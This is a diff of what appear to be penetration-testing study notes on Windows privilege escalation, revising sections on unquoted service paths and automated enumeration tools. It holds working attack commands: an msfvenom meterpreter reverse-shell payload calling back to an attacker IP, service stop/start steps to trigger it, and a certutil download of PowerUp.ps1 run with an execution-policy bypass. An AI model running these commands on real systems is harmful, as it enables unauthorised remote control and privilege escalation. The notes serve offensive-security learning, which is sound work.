@@ -424,12 +424,14 @@ if you find BINARY_PATH_NAME in the output you can change the configuration
 
 13- Unquoted Service Path
 this means the service path doesn't have quotes  so what will happen is the windows will run the following path as Program.exe -> Program Files.exe -> Unqouted.exe -> Unqouted Path.exe -> Unqouted Path Service.exe.
-run PowerUp.ps1 to check the unquoted path
+run PowerUp.ps1/winPEAS.exe to check the unquoted path
 C:\Program Files\Unquoted Path Service\Common Files\...
-so what if you can make a malicious executable file named Common.exe? Windows will run it
+-     sc query ServiceName #make sure that service is running
+-     sc stop ServiceName #stop the service
 create a common.exe file using msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe -o common.exe
 move the file to the common path and upload the file then start the service again 
--     sc start unquotedsvc
+-     sc start ServiceName
+
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
@@ -674,10 +676,9 @@ File Permission
 F> Full access | M> Modify access |RX> Read and execute access| R>Read-only access| W>Write-only
 -     icacls "C:\xampp\apache\bin\fida.exe"  (check permission)
  Automated Tools
-Powerup
+Powerup     In the last line type Invoke-AllChecks
 -     certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
-powershell -ep bypass
--     . .\PowerUp.ps1
+powershell -ep bypass .\PowerUp.ps1
 Invoke-AllChecks (check all possible vulnerability except plaintext passwd)
 Winpeas.exe (all including plaintext passwd)
 Windpeas.exe If .net 4.5 (run otherwise)
